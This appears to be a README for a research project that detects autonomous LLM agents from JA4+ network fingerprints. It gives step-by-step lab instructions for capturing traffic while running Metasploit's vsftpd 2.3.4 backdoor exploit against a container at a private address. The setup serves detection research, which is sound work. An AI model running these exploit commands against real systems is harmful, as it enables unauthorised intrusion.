# artificial-intrusion-detection
Passive Identification of Autonomous LLM Agents via JA4+ Network Fingerprinting and Machine Learning

## Exploit instructions

1. Spin up the containers
``` terminal
docker compose up -d
```

2. Start tshark from a separate terminal
``` terminal
docker exec -it attacker tshark -i eth0 -w /root/pcaps/<your-pcap-name> > /dev/null 2>&1 &
```

3. Drop into the attacker node
``` terminal
docker exec -it attacker bash
msfconsole -q
```

4. On the attacker node, configure your exploit
``` terminal
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.10.10.10
set LHOST 10.10.10.20
exploit
```

5. Finish exploiting and exit
``` terminal
exit
exit
pkill tshark
```

6. If analyzing the pcap, change ownership from root
``` terminal
sudo chown $USER:$USER pcaps/<your-pcap-file>
```

